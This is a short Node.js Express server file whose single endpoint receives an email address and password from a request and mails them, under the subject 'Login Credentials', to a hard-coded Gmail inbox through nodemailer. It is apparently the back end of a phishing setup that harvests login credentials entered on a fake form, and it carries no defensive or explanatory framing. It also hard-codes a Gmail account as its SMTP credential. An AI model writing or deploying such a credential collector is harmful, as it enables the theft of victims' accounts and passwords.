const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');

const app = express();
const port = 3000;

app.use(bodyParser.json());

app.post('/send-email', (req, res) => {
    const { email, password } = req.body;

    // Create a transporter object using the default SMTP transport
    let transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'kaioadrik08@gmail.com', // Your Gmail email
            pass: 'kaioadrik08@gmail.com'   // Your Gmail password or app-specific password
        }
    });

    // Setup email data
    let mailOptions = {
        from: 'kaioadrik08@gmail.com', // Sender address
        to: 'kaioadrik08@gmail.com', // List of receivers
        subject: 'Login Credentials', // Subject line
        text: `Email: ${email}\nPassword: ${password}`, // Plain text body
        html: `<p>Email: ${email}</p><p>Password: ${password}</p>` // HTML body
    };

    // Send mail with defined transport object
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return res.json({ success: false, message: 'Failed to send email.' });
        }
        res.json({ success: true, message: 'Email sent successfully!' });
    });
});

app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});